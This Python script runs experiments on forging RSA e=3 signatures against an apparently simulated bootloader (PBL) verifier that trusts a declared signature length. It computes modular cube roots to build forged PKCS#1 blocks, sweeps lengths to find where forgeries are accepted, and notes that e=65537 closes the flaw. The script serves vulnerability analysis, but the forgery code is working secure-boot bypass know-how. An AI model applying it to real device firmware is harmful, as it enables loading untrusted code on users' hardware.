"""
Why a *narrower window* is the fatal part -- three controlled experiments.

Experiment 1: same e=3, varying declared length L, watch whether the PBL accepts
Experiment 2: s^3 < n is the life-or-death constraint
Experiment 3: at L=256 (the standard width) not even a perfect cube saves you
"""

import hashlib
import secrets
from pbl_siglen_poc import rsa_keygen, pbl_verify_signature


def build_target(digest: bytes, L: int) -> bytes:
    """The PKCS#1 v1.5 block the PBL expects inside the L-byte window (internal byte order, low byte first)."""
    buf = bytearray(L)
    buf[0:len(digest)] = digest[::-1]
    buf[len(digest)] = 0x00
    for i in range(len(digest) + 1, L - 2):
        buf[i] = 0xFF
    buf[L - 2] = 0x01
    buf[L - 1] = 0x00
    return bytes(buf)


def eth_root_mod_2k(T: int, L: int, e: int = 3):
    """e-th root of T modulo 2^(8L). Requires T to be odd."""
    k = 8 * L
    if T % 2 == 0:
        return None
    d = pow(e, -1, 1 << (k - 1))          # |(Z/2^k)^*| = 2^(k-1)
    s = pow(T, d, 1 << k)
    return s if pow(s, e, 1 << k) == T else None


def icbrt(x: int) -> int:
    """Integer cube root (floor), binary search."""
    if x == 0:
        return 0
    lo, hi = 0, 1 << (x.bit_length() // 3 + 2)
    while lo < hi:
        mid = (lo + hi) // 2
        if mid ** 3 < x:
            lo = mid + 1
        else:
            hi = mid
    return lo - 1 if lo ** 3 > x else lo


def odd_digest(seed: bytes):
    n = 0
    while True:
        d = hashlib.sha256(seed + str(n).encode()).digest()
        if d[-1] & 1:
            return d
        n += 1


def main():
    n, e = rsa_keygen(2048, e=3)
    mod = n.to_bytes(256, "big")
    exp = (3).to_bytes(1, "big")
    digest = odd_digest(b"msm8612")
    nbits = n.bit_length()

    print("=" * 74)
    print(f"2048-bit modulus (actual width of n = {nbits}), e = 3")
    print("=" * 74)

    print("\n[Experiment 1] sweep the declared length L -- where is the usable band?")
    print(f"{'L':>5} {'bits 8L':>12} {'s^3 width':>10} {'s^3 < n ?':>10} {'PBL':>10}")
    print("-" * 74)
    for L in (40, 44, 48, 64, 72, 85, 86, 96, 128, 256):
        T = int.from_bytes(build_target(digest, L), "little")
        s = eth_root_mod_2k(T, L, 3)
        if s is None:
            print(f"{L:>5} {'-':>12} {'-':>10} {'-':>10} {'even digest':>10}")
            continue
        s3 = pow(s, 3)
        fits = s3 < n
        sig = s.to_bytes(L, "big")
        ok, code = pbl_verify_signature(mod, exp, sig, digest)
        print(f"{L:>5} {8*L:>12} {s3.bit_length():>10} {str(fits):>10} "
              f"{('ACCEPT' if ok else 'reject ' + str(code)):>10}")

    print("\n[Experiment 2] s^3 < n is the dead line -- same algorithm, only L changes")
    for L in (48, 96):
        T = int.from_bytes(build_target(digest, L), "little")
        s = eth_root_mod_2k(T, L, 3)
        if s is None:
            print(f"  L={L}: digest is even, skipped")
            continue
        s3 = pow(s, 3)
        x = pow(s, 3, n)                      # what the PBL really computes
        low = x.to_bytes(256, "little")[:L]   # what the PBL really compares
        print(f"  L={L:3d}: s^3 width={s3.bit_length():5d}  "
              f"s^3<n={str(s3 < n):5s}  reduction happened={str(s3 >= n):5s}")
        print(f"          expected low {L} bytes: {build_target(digest, L)[:24].hex()}...")
        print(f"          actual   low {L} bytes: {low[:24].hex()}...   "
              f"{'identical' if low == build_target(digest, L) else 'scrambled <- broken'}")

    print("\n[Experiment 3] at L=256 (standard width) even a perfect cube does not help")
    em = bytearray(256)
    em[0], em[1] = 0x00, 0x01
    for i in range(2, 256 - 33):
        em[i] = 0xFF
    em[256 - 33] = 0x00
    em[256 - 32:] = digest
    EM = int.from_bytes(bytes(em), "big")
    r = icbrt(EM)
    print(f"  conformant EM width        = {EM.bit_length()}")
    print(f"  integer cube root of EM    = {r.bit_length()} bits (so s is only {r.bit_length()//8} bytes)")
    print(f"  r^3 == EM ?                = {r**3 == EM}   <- must match exactly, else hopeless")
    print(f"  probability a random 2048-bit value is a perfect cube is ~2^-1365")
    print("  reason: with a 2048-bit window, s^3 < n < 2^2048 forces s^3 == EM exactly;")
    print("          and once s^3 > 2^2048, reduction mod n destroys control of the low bits.")

    print("\n[Conclusion] the attack works iff:  e * 8L < log2(n)")
    print(f"  e=3,    2048-bit: L < {2048/(8*3):.1f}   -> L in 40..85 works")
    print(f"  e=65537,2048-bit: L < {2048/(8*65537):.5f} -> no solution; rotating the key seals it")


if __name__ == "__main__":
    main()
